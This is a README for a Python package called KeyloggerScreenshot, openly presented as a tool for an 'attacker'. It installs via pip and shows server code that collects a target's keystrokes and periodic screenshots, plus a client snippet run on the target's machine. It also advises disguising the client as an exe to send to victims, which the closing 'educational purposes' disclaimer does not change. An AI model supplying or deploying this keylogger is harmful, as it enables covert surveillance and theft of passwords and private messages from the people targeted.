KeyloggerScreenshot
===================

Created by: Fawaz Bashiru
KeyloggerScreenshot allows the attacker to get all the information the target was typing and a screenshot of a specific minutes which is being calculated in the script

To install KeyloggerScreenshot simply type:

`pip install KeyloggerScreenshot`

In your terminal

HOW DOES KeyloggerScreenshot WORK?
==================================

This module can be used in Windows and Linux
The attacker should have two different servers on different files. The ip can be the same but the port number should be distinguished

For example:

Servers
------
```python
#server_photos.py:
ip, port = "127.0.0.1", 1234
server_photos = ServerPhotos(ip, port)
server_photos.start()

#server_keylogger.py:
ip, port = "127.0.0.1",5678
server_keylogger = ServerKeylogger(ip, port)
server_keylogger.start()

```

"server_photos.py" will get all the screenshots and "server_keylogger.py" will get everything the target has typed

Client_Target
-------------
```python
#client_target.py
key_client = KeyloggerTarget("127.0.0.1", 1234, "127.0.0.1",5678, duration_in_seconds=300)
key_client.start()

```

Additional
==========
* You can send "client_target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.
